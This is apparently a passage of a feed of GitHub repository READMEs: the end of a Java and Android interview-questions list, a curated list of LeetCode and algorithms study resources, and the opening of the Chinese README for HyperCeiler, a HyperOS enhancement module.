 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is serialization? How do you implement it?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;transient&lt;/code&gt; modifier?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are anonymous classes?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between using &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;.equals&lt;/code&gt; on an object?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the &lt;code&gt;hashCode()&lt;/code&gt; and &lt;code&gt;equals()&lt;/code&gt; used for?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When would you make an object value &lt;code&gt;final&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are these &lt;code&gt;final&lt;/code&gt;, &lt;code&gt;finally&lt;/code&gt; and &lt;code&gt;finalize&lt;/code&gt; keywords?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between "throw" and "throws" keyword in Java?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;throws&lt;/code&gt; is just used to indicated which exception is to be thrown. But the &lt;code&gt;throw&lt;/code&gt; keyword is used to throw some exception from any static block or any method.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What does the &lt;code&gt;static&lt;/code&gt; word mean in Java?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;In case of &lt;code&gt;static&lt;/code&gt; variable it means that this variable (its' value or the object it references) spans across all instances of enclosing class (changing it in one instance affects all others), while in case of &lt;code&gt;static&lt;/code&gt; methods it means that these methods can be invoked without an instance of their enclosing class. It is useful, for example, when you create util classes that need not be instantiated every time you want to use them.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can a &lt;code&gt;static&lt;/code&gt; method be overridden in Java?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;While child class can override a static method with another static method with the same signature (return type can be down-casted), it is not truly overridden - it becomes "hidden", but both methods can still be accessed under right circumstances (see question about overloading/overriding above).&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When is a &lt;code&gt;static&lt;/code&gt; block run?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Code inside static block is executed only once: the first time you make an object of that class or the first time you access a static member of that class (even if you never make an object of that class).&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Reflection in Java&lt;/strong&gt; - &lt;a href="https://x.com/amitiitbhu/status/1819234916812341567"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Dependency Injection?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between &lt;code&gt;StringBuffer&lt;/code&gt; and &lt;code&gt;StringBuilder&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/string-vs-stringbuffer-vs-stringbuilder"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between fail-fast and fail-safe iterators in Java?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Monitor and Synchronization&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Other Topics&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Describe SQLite.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Have you used Room?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can we identify the users who have uninstalled our application?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Android Development Best Practices.&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/android-development-best-practices"&gt;Android Development Best Practices&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;React Native vs Flutter&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/react-native-vs-flutter"&gt;React Native vs Flutter&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the metrics that you should measure continuously while android application development?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/android-app-performance-metrics"&gt;Android App Performance Metrics&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to avoid API keys from check-in into VCS?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the Kotlin Multiplatform work?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/how-does-the-kotlin-multiplatform-work"&gt;Blog&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to use Memory Heap Dumps data?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to implement Dark Theme in your app?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to secure the API keys used in an Android App?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Cleartext traffic?&lt;/strong&gt; Learn from here: &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7281879316601126913-x1az"&gt;What is Cleartext traffic?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell something about memory usage in Android.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Annotation processing.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the Android Push Notification system work?&lt;/strong&gt; Learn from here: &lt;a href="https://youtu.be/810IFG2sWlc"&gt;How does the Android Push Notification system work?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Android Push Notification Flow using FCM.&lt;/strong&gt; Learn from here: &lt;a href="https://www.youtube.com/watch?v=TrufwW4ILHg"&gt;Android Push Notification Flow using FCM&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to show local Notification at an exact time?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Data Structures and Algorithms&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Android Developer should know these Data Structures for Next Interview&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/android-developer-should-know-these-data-structures-for-next-interview"&gt;Check here&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;High-quality videos to prepare for Android Interview - &lt;a href="https://www.youtube.com/@amitshekhar"&gt;Amit Shekhar YouTube Channel&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;High-quality blogs to prepare for Android Interview - &lt;a href="https://outcomeschool.com/blog"&gt;Check here - Outcome School Blog&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;Prepare for Machine Learning Interview: &lt;a href="https://github.com/amitshekhariitbhu/machine-learning-interview-questions"&gt;Machine Learning Interview Questions&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;Found this project useful &lt;span&gt;❤️&lt;/span&gt;&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Support by clicking the &lt;span&gt;⭐&lt;/span&gt; button on the upper right of this page. &lt;span&gt;✌&lt;/span&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can connect with me on:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://x.com/amitiitbhu"&gt;X/Twitter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@amitshekhar"&gt;YouTube&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.linkedin.com/in/amit-shekhar-iitbhu"&gt;LinkedIn&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/amitshekhariitbhu"&gt;GitHub&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;License&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;   Copyright (C) 2025 Amit Shekhar

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>ashishps1/awesome-leetcode-resources</title>
      <link>https://github.com/ashishps1/awesome-leetcode-resources</link>
      <description>&lt;p&gt;Awesome LeetCode resources to learn Data Structures and Algorithms and prepare for Coding Interviews.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/ashishps1/awesome-leetcode-resources/main/images/leetcode-repo-logo.png" width="350" height="200" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://blog.algomaster.io/"&gt;Join Free Newsletter&lt;/a&gt; &lt;/p&gt; 
&lt;p&gt;This repository contains awesome LeetCode resources to learn Data Structures and Algorithms (DSA) and prepare for Coding interviews.&lt;/p&gt; 
&lt;p&gt;👉 If you want to master DSA patterns, checkout &lt;a href="https://algomaster.io"&gt;AlgoMaster.io&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;💡 Tips&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/how-i-mastered-data-structures-and-algorithms"&gt;How I Mastered DSA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/how-to-start-leetcode-in-2025"&gt;How to Start LeetCode&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/15-leetcode-patterns"&gt;15 Leetcode Patterns&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📌 Fundamental Concepts&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/57bd4963-462f-4294-a972-4012691fc729"&gt;Algorithmic Complexity&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.bigocheatsheet.com/"&gt;Big-O Cheat Sheet&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/c650df76-f978-46ee-a572-eb13c354905d"&gt;Bit Manipulation Techniques&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/jl-codes/understanding-sorting-algorithms-af6222995c8"&gt;Sorting Algorithms&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1800120/become-master-in-linked-list"&gt;Linked List&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/5d7a1368-7a0c-461a-93a9-732333ceb2a8"&gt;Dummy Node Technique&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/to-queue-or-not-to-queue-2653bcde5b04"&gt;Queues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/stacks-and-overflows-dbcf7854dc67"&gt;Stacks&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/taking-hash-tables-off-the-shelf-139cbf4752f0"&gt;Hash Tables&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/learning-to-love-heaps-cef2b273a238"&gt;Heaps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1733447/become-master-in-recursion"&gt;Recursion&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/algorithms-and-leetcode/backtracking-e001561b9f28"&gt;Backtracking&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1820334/Become-Master-in-Tree"&gt;Trees&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/trying-to-understand-tries-3ec6bede0014"&gt;Tries&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems"&gt;Binary Search&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.freecodecamp.org/news/greedy-algorithms/"&gt;Greedy Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/less-repetition-more-dynamic-programming-43d29830a630"&gt;Dynamic Programming&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/a-gentle-introduction-to-graph-theory-77969829ead8"&gt;Graph Theory&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/master-graph-algorithms-for-coding"&gt;Important Graph Algorithms&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/deep-dive-through-a-graph-dfs-traversal-8177df5d0f13"&gt;DFS Traversal&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/basecs/going-broad-in-a-graph-bfs-traversal-959bd1a09255"&gt;BFS Traversal&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/1072418/Disjoint-Set-Union-(DSU)Union-Find-A-Complete-Guide"&gt;Union-Find&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1059477/A-guide-to-Dijkstra's-Algorithm"&gt;Dijkstra Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.hackerearth.com/practice/algorithms/graphs/minimum-spanning-tree/tutorial/"&gt;Minimum Spanning Tree&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🚀 Patterns&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/15-leetcode-patterns"&gt;15 Leetcode Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/20-patterns-to-master-dynamic-programming"&gt;20 DP Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=QzZ7nmouLTI"&gt;Two Pointers Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/f4412a17-7a3a-4d0b-8e39-9ea8f429bf7c"&gt;Sliding Window Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=yuws7YK0Yng"&gt;Prefix Sum Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=b139yf7Ik-E"&gt;Fast and Slow Pointers Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=6_v6OoxvMOE"&gt;Top 'K' Elements Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=NUWAXbSlsws"&gt;Kadane's Algorithm&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=y2d0VHdvfdc"&gt;Sliding Window Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=auoTGovuo9A"&gt;Linked List In-place Reversal Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=DtJVwbbicjQ"&gt;Monotonic Stack Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/812e72f7-eced-4256-a4c1-00606ae50679"&gt;Overlapping Intervals Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/81d42ca2-600c-4252-aa33-a56462090048"&gt;Backtracking Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/d0d81b04-4c2a-4b45-a101-5137c3146686"&gt;Modified Binary Search Pattern&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/937307/Iterative-or-Recursive-or-DFS-and-BFS-Tree-Traversal-or-In-Pre-Post-and-LevelOrder-or-Views"&gt;Tree Patterns&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-0-iterative-traversals-on-trees-d373568eb0ec"&gt;Tree Iterative Traversal&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2879240/TREE-QUESTION-PATTERN-2023-oror-TREE-STUDY-GUIDE"&gt;Tree Question Pattern&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/655708/Graph-For-Beginners-Problems-or-Pattern-or-Sample-Solutions"&gt;Graph Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-1-bfs-dfs-25-of-the-problems-part-1-519450a84353"&gt;DFS + BFS Patterns (1)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/leetcode-patterns/leetcode-pattern-2-dfs-bfs-25-of-the-problems-part-2-a5b269597f52"&gt;DFS + BFS Patterns (2)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📝 Must-Read Leetcode Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/frequency-of-the-most-frequent-element/solutions/1175088/C++-Maximum-Sliding-Window-Cheatsheet-Template/"&gt;Sliding Window Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/1688903/Solved-all-two-pointers-problems-in-100-days"&gt;Two Pointers Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2001789/Collections-of-Important-String-questions-Pattern"&gt;Collections of Important String Questions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/minimum-window-substring/solutions/26808/Here-is-a-10-line-template-that-can-solve-most-'substring'-problems/"&gt;Substring Problem Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/786126/Python-Powerful-Ultimate-Binary-Search-Template.-Solved-many-problems"&gt;Binary Search Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/permutations/solutions/18239/A-general-approach-to-backtracking-questions-in-Java-(Subsets-Permutations-Combination-Sum-Palindrome-Partioning)/"&gt;A General Approach to Backtracking Questions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/2347639/A-comprehensive-guide-and-template-for-monotonic-stack-based-problems"&gt;Monotonic Stack Template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/1127238/master-heap-by-solving-23-questions-in-4-patterns-category"&gt;Heap Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/4282051/all-types-of-patterns-for-bits-manipulations-and-how-to-use-it"&gt;Bit Manipulation Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/study-guide/458695/Dynamic-Programming-Patterns"&gt;Dynamic Programming Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/solutions/108870/most-consistent-ways-of-dealing-with-the-series-of-stock-problems/"&gt;Stock Series Patterns&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;✅ Curated Problems&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/practice/dsa-patterns"&gt;AlgoMaster 300&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/discuss/general-discussion/460599/blind-75-leetcode-questions"&gt;Blind 75&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/studyplan/top-100-liked/"&gt;Leetcode Top 100 Liked&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://leetcode.com/studyplan/top-interview-150/"&gt;Leetcode Top Interview 150&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📺 YouTube Playlist&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLK63NuByH5o-tqaMUHRA4r8ObRW7PWz45"&gt;AlgoMaster LeetCode Pattern Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDN4rrl48XKpZkf03iYFl-O29szjTrs_O"&gt;Abdul Bari's Algorithms Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDV1Zeh2NRsB6SWUrDFW2RmDotAfPbeHu"&gt;William Fiset's Data Structure Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLDV1Zeh2NRsDGO4--qE8yH72HFL1Km93P"&gt;William Fiset's Graphs Playlist&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr"&gt;Tushar Roy's Dynamic Programming Playlist&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📇 Courses&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/algorithms-part1"&gt;Coursera - Algorithms, Part I&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/algorithms-part2"&gt;Coursera - Algorithms, Part 2&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📚 Books&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/B08CMLS7LZ"&gt;Data Structures And Algorithms Made Easy&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/0984782850"&gt;Cracking the Coding Interview&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📩 Newsletter&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/"&gt;AlgoMaster Newsletter&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🔎 Visualization&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://visualgo.net/en"&gt;VisuAlgo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/jaroslaw-weber/algo-lens"&gt;Algo-lens: Visualize leetcode problems&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📎 LeetCode Extensions&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-timer/gfkgelnlcnomnahkfmhemgpahgmibofd"&gt;LeetCode Timer&lt;/a&gt;: Easily time your leetcode practise sessions with automatic time setting based on difficulty.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-video-solutions/ilnmgkahgjdpkoliooildngldmilhelm"&gt;LeetCode Video Solutions&lt;/a&gt;: Watch free LeetCode video ▶ solutions on the problem page itself.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leetcode-format/imogghebhifnnlgogigikjecilkicfpp"&gt;LeetCode Format&lt;/a&gt;: Adds Format code button on leetcode to format the code using Prettier code formatter.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://chromewebstore.google.com/detail/leethub-v2/mhanfgfagplhgemhjfeolkkdidbakocm?hl=en"&gt;LeetHub v2&lt;/a&gt;: Automatically integrate your Leetcode &amp;amp; GeeksforGeeks submissions to GitHub.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://marketplace.visualstudio.com/items?itemName=LeetCode.vscode-leetcode"&gt;LeetCode VS Code Extension&lt;/a&gt;: Solve LeetCode problems in VS Code.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Your contributions are most welcome!&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p align="center"&gt; &lt;i&gt;If you find this resource helpful, please give it a star ⭐️ and share it with others!&lt;/i&gt; &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ReChronoRain/HyperCeiler</title>
      <link>https://github.com/ReChronoRain/HyperCeiler</link>
      <description>&lt;p&gt;HyperOS enhancement module - Make HyperOS Great Again!&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;img src="\imgs\icon.webp" width="160" height="160" style="display: block; margin: 0 auto;" alt="icon" /&gt; 
 &lt;h1&gt;HyperCeiler&lt;/h1&gt; 
 &lt;h3&gt;Make HyperOS Great Again!&lt;/h3&gt; 
 &lt;p&gt;简体中文&amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&lt;a href="https://raw.githubusercontent.com/ReChronoRain/HyperCeiler/main/README_zh-HK.md"&gt;繁體中文&lt;/a&gt;&amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&lt;a href="https://raw.githubusercontent.com/ReChronoRain/HyperCeiler/main/README_en-US.md"&gt;English&lt;/a&gt;&amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&lt;a href="https://raw.githubusercontent.com/ReChronoRain/HyperCeiler/main/README_uk_UA.md"&gt;Українська&lt;/a&gt;&amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;&lt;a href="https://raw.githubusercontent.com/ReChronoRain/HyperCeiler/main/README_pt-BR.md"&gt;Português (Brasil)&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;当前支持的版本&lt;/h2&gt; 
&lt;p&gt;Android 15-16 的 HyperOS&lt;/p&gt; 
&lt;h2&gt;使用前说明&lt;/h2&gt; 
&lt;p&gt;请在 &lt;a href="https://github.com/LSPosed/LSPosed/releases"&gt;LSPosed&lt;/a&gt; 中启用 HyperCeiler，然后在 HyperCeiler 应用内启用对应的功能，重启作用域（需要 Root 权限）。&lt;/p&gt; 
&lt;p&gt;本模块&lt;b&gt;不支持&lt;/b&gt;&lt;code&gt;修改较多的第三方 Xiaomi HyperOS ROM&lt;/code&gt;、&lt;code&gt;修改较多的系统软件&lt;/code&gt;，以及&lt;code&gt;部分国际 Xiaomi HyperOS ROM&lt;/code&gt;。&lt;/p&gt; 
&lt;p&gt;目前 HyperCeiler 是基于 Android 16 的 Xiaomi HyperOS 3.0 的手机端设备进行适配，覆盖不是很完整，需要不断测试和改进。&lt;/p&gt; 
